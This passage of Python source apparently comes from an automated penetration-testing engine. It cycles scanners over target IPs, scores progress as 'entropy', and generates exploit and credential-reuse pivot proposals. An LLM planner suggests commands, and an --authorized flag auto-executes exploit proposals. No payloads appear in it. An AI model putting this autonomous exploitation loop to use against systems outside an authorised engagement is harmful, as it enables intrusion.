                name, res = _run_one(serial_item)
                concurrent_results[name] = res
            else:
                concurrent_results[serial_item[1]] = {
                    "instrument": serial_item[1], "success": False,
                    "error": "cycle budget exceeded",
                }

        # Generate follow-on exploit proposals in the main thread after the
        # instrument sweep so interactive review behaves cleanly.
        try:
            from exploit_dispatch import generate_exploit_proposals, _get_lhost, AUXILIARY_MAP
        except Exception as exc:
            reporter.emit("exploit_dispatch_import", f"exploit dispatch unavailable: {exc}", target_ip=ip, exc=exc)
            generate_exploit_proposals = None
            _get_lhost = None
            AUXILIARY_MAP = {}

        if generate_exploit_proposals is not None and _get_lhost is not None:
            emit_follow_on_proposals(
                concurrent_results=concurrent_results,
                ip=ip,
                node_key=node_key,
                out_path=out_path,
                run_id=run_id,
                load_wicket_states=load_wicket_states,
                generate_exploit_proposals=generate_exploit_proposals,
                get_lhost=_get_lhost,
                interactive_review=interactive_review,
                proposals_dir=SKG_STATE_DIR / "proposals",
                print_fn=print,
                reporter=reporter,
            )

        # ── Auxiliary module proposals (service-specific scanners) ─────────
        # After every instrument sweep, check the realized wicket set against
        # AUXILIARY_MAP and generate observation proposals for reachable services.
        if AUXILIARY_MAP and _get_lhost is not None:
            emit_auxiliary_proposals(
                ip=ip,
                node_key=node_key,
                target=t["target"],
                run_id=run_id,
                out_path=out_path,
                auxiliary_map=AUXILIARY_MAP,
                lhost=_get_lhost(),
                load_wicket_states=load_wicket_states,
                proposals_dir=SKG_STATE_DIR / "proposals",
                print_fn=print,
                reporter=reporter,
            )

        # Surface per-instrument failures so the operator sees what actually
        # happened, even if another instrument succeeded.
        for _name, _res in concurrent_results.items():
            if _res.get("error"):
                print(f"    [WARN] {_name} failed: {_res['error']}")

        # Merge: use last successful result for downstream E measurement
        # (any instrument that ran and didn't error counts as an action)
        result = {"success": False}
        for _name, _res in concurrent_results.items():
            if _res.get("success") or _res.get("action") == "operator":
                result = _res
                break
        if not result.get("success") and not result.get("action"):
            # All failed — use first result for error reporting
            result = next(iter(concurrent_results.values())) if concurrent_results else {"success": False}

        # Best instrument name and instance for reporting and penalty tracking.
        # In concurrent mode, all instruments that ran share the penalty outcome.
        lead_item = selected_items[0]
        best_name = lead_item[1]
        best_inst = lead_item[2]
        all_run_insts = [(name, inst) for _, name, inst in selected_items]

        # Measure entropy change — recompute including fold contribution
        # so delta_E reflects the full field energy shift, not just wicket changes
        # Refresh canonical surface and recompute applicable wickets after the
        # sweep so newly observed services/domains can collapse state in-cycle.
        try:
            refreshed_surface = _hydrate_surface_from_latest_nmap(surface_path)
            refreshed_target = next(
                (x for x in refreshed_surface.get("targets", []) if x.get("ip") == ip),
                t["target"],
            )
        except Exception:
            refreshed_target = t["target"]

        refreshed_domains = derive_effective_domains(
            refreshed_target,
            ip=ip,
            discovery_dir=DISCOVERY_DIR,
            view_state=_load_fresh_view_state(ip) or t.get("view_state") or {},
        )
        refreshed_applicable = applicable_wickets_for_domains(refreshed_domains, domain_wickets)

        new_states   = load_wicket_states(ip)
        E_after_base = field_entropy(new_states, refreshed_applicable, ip=ip)
        # Re-detect folds after instrument ran (structural folds may resolve
        # if a toolchain was created; temporal folds may refresh)
        new_fold_boost = t["fold_boost"]  # conservative: assume folds unchanged
        try:
            from skg.kernel.folds import FoldDetector, FoldManager
            new_fd = FoldDetector()
            new_folds = new_fd.detect_all(DISCOVERY_DIR, CVE_DIR, SKG_HOME)
            new_fm = FoldManager()
            for f in new_folds:
                if _fold_identity_key(f) == identity_key:
                    new_fm.add(f)
            new_fold_boost = new_fm.total_gravity_weight()
        except Exception as exc:
            reporter.emit(
                "fold_refresh",
                f"failed to refresh folds after instrument execution: {exc}",
                target_ip=ip,
                exc=exc,
            )
        E_after = E_after_base + new_fold_boost
        delta_E = E_before - E_after

        try:
            _record_cycle_pearl(
                ip=ip,
                run_id=run_id,
                cycle_num=cycle_num,
                before_states=t["states"],
                after_states=new_states,
                before_target=t["target"],
                after_target=refreshed_target,
                before_domains=set(t["target"].get("domains", [])),
                after_domains=refreshed_domains,
                before_entropy=E_before,
                after_entropy=E_after,
                before_fold_boost=t["fold_boost"],
                after_fold_boost=new_fold_boost,
                concurrent_results=concurrent_results,
                fold_manager=new_fm if 'new_fm' in locals() else None,
            )
        except Exception as exc:
            reporter.emit(
                "cycle_pearl",
                f"failed to record cycle pearl: {exc}",
                target_ip=ip,
                exc=exc,
            )

        if result.get("success"):
            actions_taken += 1
            if delta_E > 0:
                entropy_reduced += delta_E
            elif delta_E < 0:
                entropy_increased += abs(delta_E)

            if delta_E > 0:
                print(f"    ✓ Entropy reduced: {E_before:.2f} → {E_after:.2f} (ΔE={delta_E:+.2f})")
                resolved = result.get("unknowns_resolved", 0)
                if resolved:
                    print(f"      {resolved} unknowns collapsed")
            elif delta_E < 0:
                print(f"    ↗ Entropy surfaced: {E_before:.2f} → {E_after:.2f} (ΔE={delta_E:+.2f})")
                print(f"      New structure or unresolved folds increased the field energy")
            elif result.get("action") == "operator":
                # Operator-pending action (MSF proposal, SSH suggestion).
                # Do NOT record as a failure — the action hasn't been executed
                # yet.  Gravity should not penalise this instrument; it should
                # come back to it after the operator acts.  We record a neutral
                # entropy history entry (current E, not 999) so the penalty
                # trigger doesn't fire.
                print(f"    ⊕ Pending operator action: {result.get('suggestion', '')}")
                if result.get("proposal_id"):
                    print(f"      Proposal: {result['proposal_id']}")
                    print(f"      Approve:  skg proposals trigger {result['proposal_id']}")
                # Record current E (not a higher value) — neutral, not penalised
                for _n, _i in all_run_insts:
                    _i.entropy_history.setdefault(node_key, []).append(E_after)
            else:
                print(f"    ○ No entropy change (E={E_after:.2f})")
                # Record a single no-op outcome. Repeated stagnation across
                # cycles triggers failed_to_reduce(), not one flat attempt.
                for _n, _i in all_run_insts:
                    _i.entropy_history.setdefault(node_key, []).append(E_after)

        else:
            error = result.get("error", "execution failed (no error message captured)")
            print(f"    ✗ Failed: {error}")
            # Hard failure — record 999 so failed_to_reduce() fires immediately
            for _n, _i in all_run_insts:
                _i.entropy_history.setdefault(node_key, []).append(999)
            # Pivot detection: if SSH/web auth failed, check credential store
            # for reuse opportunities on related services.
            _try_instrument_pivot(node_key, ip, t, result, instruments, run_id, DISCOVERY_DIR)

        # Process a broader slice of the field each cycle so whole-network
        # gravity behaves like a substrate sweep, not a top-3 scheduler.
        if actions_taken >= 5:
            break

    # ── Execute any triggered proposals before next cycle ─────────────────
    # Operator can run 'skg proposals trigger <id>' in another terminal
    # while gravity is running; gravity picks them up at cycle boundary.
    execute_triggered_proposals(
        out_path=out_path,
        run_id=run_id,
        focus_target=focus_target,
        proposals_dir=SKG_STATE_DIR / "proposals",
        print_fn=print,
        reporter=reporter,
    )

    # ── Dark hypothesis → forge: close the autonomous loop ─────────────────
    # Dark hypotheses were computed per-target during the landscape build.
    # Convert them into toolchain generation proposals so the forge builds
    # instruments that cover the dark domains, closing the observation gap.
    try:
        created_dark_proposals = _create_instrument_proposals_from_dark_hypotheses(landscape)
        if created_dark_proposals:
            print(f"\n  [FORGE] {len(created_dark_proposals)} instrument proposal(s) from dark hypotheses:")
            for _pid in created_dark_proposals[:6]:
                print(f"    {_pid}  → skg proposals show {_pid[:8]}")
    except Exception as exc:
        reporter.emit("dark_hypothesis_forge", f"dark hypothesis forge pipeline error: {exc}", exc=exc)

    # ── Dark hypothesis → cognitive planner: route to *existing* instruments ─
    # Forge handles unknown domains.  This handles the complementary case:
    # a domain has instruments but none is aimed at the specific dark wicket.
    # The LLM reasons about which existing instrument + command resolves it.
    try:
        from skg.sensors.dark_hypothesis_sensor import plan_dark_hypotheses
        import yaml as _yaml_cog
        _cog_cfg_path = REPO_ROOT / "config" / "skg_config.yaml"
        _cog_cfg_raw  = _yaml_cog.safe_load(_cog_cfg_path.read_text()) if _cog_cfg_path.exists() else {}
        _cog_sensor_cfg = (_cog_cfg_raw or {}).get("dark_hypothesis_sensor", {})
        _cog_min_torque = float(_cog_sensor_cfg.get("min_torque", 1.5))
        _cog_max        = int(_cog_sensor_cfg.get("max_proposals", 6))
        _cog_proposals  = plan_dark_hypotheses(
            landscape,
            min_torque=_cog_min_torque,
            max_proposals=_cog_max,
        )
        if _cog_proposals:
            print(f"\n  [COGNITIVE] {len(_cog_proposals)} action proposal(s) from dark hypotheses:")
            for _cp in _cog_proposals[:6]:
                print(f"    {_cp['id']}  target={_cp['target']}  cmd={_cp.get('command','')[:50]}")
    except Exception as exc:
        reporter.emit("dark_hypothesis_cognitive", f"dark hypothesis planner error: {exc}", exc=exc)

    # ── Cycle summary ──
    total_unknown   = round(sum(float(t["unknowns"]) for t in landscape), 4)
    total_folds     = sum(t["n_folds"]  for t in landscape)
    total_fold_boost = sum(t["fold_boost"] for t in landscape)
    total_entropy   = sum(t["entropy"]  for t in landscape)

    print(f"\n{'='*70}")
    print(f"  CYCLE {cycle_num} COMPLETE")
    print(f"  Actions : {actions_taken}")
    print(f"  ΔE      : {entropy_reduced:+.2f}")
    if entropy_increased > 0:
        print(f"  ΔE↑     : +{entropy_increased:.2f} surfaced")
    print(f"  Unresolved: {total_unknown:.2f}  Folds: {total_folds} (+{total_fold_boost:.2f})")
    print(f"  Total E : {total_entropy:.2f}  "
          f"(base {total_entropy - total_fold_boost:.2f} + "
          f"fold {total_fold_boost:.2f})")
    if reporter.count() > 0:
        print(f"  Warnings: {reporter.count()}  ({reporter.path})")

    # Surface folds that need operator attention
    high_weight_folds = []
    for t in landscape:
        if t["fold_manager"]:
            for fold in t["fold_manager"].all():
                if fold.gravity_weight() >= 0.80:
                    high_weight_folds.append((t["ip"], fold))

    if high_weight_folds:
        print(f"\n  High-weight folds requiring attention:")
        for ip, fold in sorted(high_weight_folds,
                                key=lambda x: -x[1].gravity_weight())[:5]:
            print(f"    {ip:18s} {fold.id[:12]:12s} [{fold.fold_type:12s}] p={fold.discovery_probability:.2f} "
                  f"Φ={fold.gravity_weight():.2f}")
            print(f"      {fold.detail[:90]}")

    print(f"{'='*70}")

    # Persist fold state for this cycle, refreshed after instrument execution
    # so new same-cycle contextual/structural folds are visible immediately.
    try:
        from skg.kernel.folds import FoldDetector, FoldManager
        fold_state_dir = Path(out_dir) / "folds"
        fold_state_dir.mkdir(parents=True, exist_ok=True)
        refreshed_by_identity: dict[str, FoldManager] = {}
        for fold in FoldDetector().detect_all(
            events_dir=DISCOVERY_DIR,
            cve_dir=CVE_DIR,
            toolchain_dir=SKG_HOME,
        ):
            identity_key = _fold_identity_key(fold)
            if identity_key:
                refreshed_by_identity.setdefault(identity_key, FoldManager()).add(fold)
        for identity_key, fm in refreshed_by_identity.items():
            fm.persist(fold_state_dir / _fold_state_filename(identity_key))
    except Exception as exc:
        reporter.emit("fold_persist", f"failed to persist refreshed fold state: {exc}", exc=exc)

    return {
        "cycle":           cycle_num,
        "actions_taken":   actions_taken,
        "entropy_reduced": entropy_reduced,
        "entropy_increased": entropy_increased,
        "total_entropy":   total_entropy,
        "total_unknowns":  total_unknown,
        "total_folds":     total_folds,
        "fold_boost":      round(total_fold_boost, 4),
        "failure_count":   reporter.count(),
    }


# ── Main loop ────────────────────────────────────────────────────────────

def _run_feedback_ingester() -> dict:
    """
    Run the FeedbackIngester to propagate realized transitions through the
    WorkloadGraph after a gravity cycle. This closes the loop:
      instrument runs → projection written → transition detected → prior propagated
      → next cycle starts with updated priors on neighbor targets.

    When the daemon is not running (standalone gravity), this instantiates the
    ingester directly so graph propagation fires regardless of daemon state.
    """
    try:
        from skg.temporal import DeltaStore
        from skg.temporal.feedback import FeedbackIngester
        from skg.graph import WorkloadGraph
        delta = DeltaStore(SKG_STATE_DIR / "delta")
        graph = WorkloadGraph(SKG_STATE_DIR / "graph")
        graph.load()
        ingester = FeedbackIngester(
            delta_store=delta,
            graph=graph,
            obs_memory=None,
            interp_dir=INTERP_DIR,
            events_dir=EVENTS_DIR,
        )
        result = ingester.process_new_interps()
        if result.get("propagations", 0) > 0:
            print(f"  [FEEDBACK] {result['processed']} projections, "
                  f"{result['transitions']} transitions, "
                  f"{result['propagations']} graph propagations")
        return result
    except Exception as exc:
        log.debug(f"[feedback] ingester unavailable: {exc}")
        return {}


def gravity_field_loop(surface_path: str, out_dir: str, max_cycles: int = 5,
                       authorized: bool = False, focus_target: str | None = None):
    """
    Run the gravity field dynamics.
    Continues until entropy stabilizes or max cycles reached.
    """
    instruments = detect_instruments()

    print(f"[SKG-GRAVITY] Gravity Field Engine v2")
    print(f"[SKG-GRAVITY] Surface: {surface_path}")
    print(f"[SKG-GRAVITY] Instruments: {sum(1 for i in instruments.values() if i.available)} available")
    print(f"[SKG-GRAVITY] Max cycles: {max_cycles}")

    prev_entropy = float('inf')
    stall_count = 0

    for i in range(1, max_cycles + 1):
        result = gravity_field_cycle(surface_path, out_dir, i, instruments,
                                     authorized=authorized, focus_target=focus_target)

        # Close the loop: propagate realized transitions through the WorkloadGraph
        # so neighbor targets receive prior updates before the next cycle begins.
        _run_feedback_ingester()

        current_entropy = result["total_entropy"]

        # Check for convergence.
        # A field is stable only when ALL targets are fully determined (E=0)
        # or when genuinely no instrument can reduce entropy anywhere.
        # A single ΔE=0 cycle just means instruments need to rotate — not convergence.
        if result["actions_taken"] == 0:
            print(f"\n[SKG-GRAVITY] No actions possible — field stabilized.")
            break

        # Only converge if E=0 across all targets (fully determined)
        if current_entropy < 0.1:
            print(f"\n[SKG-GRAVITY] Field fully determined (E≈0). Engagement complete.")
            break

        # If entropy hasn't moved for 3 consecutive cycles, we're genuinely stuck.
        # Not after 1 cycle — that's just penalty rotation.
        if abs(current_entropy - prev_entropy) < 0.01 and i > 1:
            stall_count += 1
            if stall_count >= 3:
                print(f"\n[SKG-GRAVITY] Entropy stable for 3 cycles — field stable.")
                print(f"  Run with --authorized to attempt autonomous exploitation.")
                break
        else:
            stall_count = 0

        prev_entropy = current_entropy

        if i < max_cycles:
            print(f"\n[SKG-GRAVITY] Pausing 2s before next cycle...")
            time.sleep(2)

    print(f"\n[SKG-GRAVITY] Field dynamics complete.")


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="SKG Gravity Field Engine — entropy-driven field dynamics")
    parser.add_argument("--surface", default=None)
    parser.add_argument("--auto", action="store_true")
    parser.add_argument("--cycles", type=int, default=5)
    parser.add_argument("--authorized", action="store_true",
                        help="Authorized engagement mode: auto-execute exploit proposals")
    parser.add_argument("--target", default=None,
                        help="Focus gravity on a single target IP")
    parser.add_argument("--out-dir", dest="out_dir",
                        default=str(DISCOVERY_DIR))
    args = parser.parse_args()

    surface_path = args.surface
    if args.auto or not surface_path:
        surfaces = sorted(glob.glob(str(DISCOVERY_DIR / "surface_*.json")), key=os.path.getmtime)
        if not surfaces:
            print("[!] No surface files. Run discovery first.")
            sys.exit(1)
        surface_path = surfaces[-1]
        print(f"[SKG-GRAVITY] Using: {surface_path}")

    gravity_field_loop(surface_path, args.out_dir, max_cycles=args.cycles,
                   authorized=getattr(args,'authorized',False),
                   focus_target=getattr(args, 'target', None))


if __name__ == "__main__":
    main()
